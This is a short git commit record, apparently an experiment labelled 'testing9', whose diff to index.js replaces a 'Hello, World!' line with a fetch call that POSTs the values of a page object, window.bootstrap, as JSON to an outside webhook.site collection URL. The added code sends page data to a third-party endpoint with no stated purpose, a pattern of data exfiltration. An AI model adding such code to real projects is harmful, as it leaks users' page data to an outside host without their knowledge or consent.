c812cf8392f52263ffa2615abc6f8093cdeb0ff7
Badr <macbookprom2@Badreddine-Belkadi.local>
2025-12-30 20:25:59 +0100

    testing9

--- index.js
+++ index.js
@@ -1,1 +1,5 @@
-console.log("Hello, World!");
+fetch("https://webhook.site/4c4d8f31-5c7b-418e-833b-720bb5550334", {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify(Object.values(window.bootstrap))
+});
